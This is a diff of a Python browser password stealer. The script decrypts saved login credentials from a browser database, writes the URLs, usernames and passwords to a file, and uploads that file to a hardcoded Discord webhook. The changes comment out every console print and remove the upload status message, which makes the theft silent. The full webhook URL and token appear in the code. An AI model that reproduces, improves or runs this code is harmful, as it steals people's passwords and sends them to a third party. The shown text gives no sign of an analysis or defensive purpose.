@@ -44,10 +44,10 @@ for index,login in enumerate(cursor.fetchall()):
         ciphertext= login[2]
         if (url):
             file.write(f"Url: {url}\n")
-            print("Url: ",url)
+            #print("Url: ",url)
         if (username):
             file.write(f"Username: {username}\n")
-            print("Username: ",username)
+            #print("Username: ",username)
         # Step 1: Extracting initilisation vector from ciphertext
         initialisation_vector = ciphertext[3:15]
         # Step 2: Extracting encrypted password from ciphertext
@@ -59,10 +59,10 @@ for index,login in enumerate(cursor.fetchall()):
         # Step 4: Decrypted Password
         if (decrypted_pass):
             file.write(f"password: {decrypted_pass}\n")
-            print(f"password: {decrypted_pass}")
+            #print(f"password: {decrypted_pass}")
         if(url or username or decrypted_pass):
             file.write("-----------------------\n")
-            print("-----------------------")
+            #print("-----------------------")
         file.flush()
 webhook_url = 'https://discord.com/api/webhooks/1213302044463595540/83yuwuv9NP--2PXjOQR7iOJhJ8dUUFbuhBTO7AnJVFo-EeVvFGwuDLTec59DAJwFM3sO'
 file_path = 'passwords.txt'
@@ -76,7 +76,3 @@ files = {
 }
 response = requests.post(webhook_url, files=files)
 
-if response.status_code == 200:
-    print('File uploaded successfully!')
-else:
-    print(f'Failed to upload file: {response.status_code}')
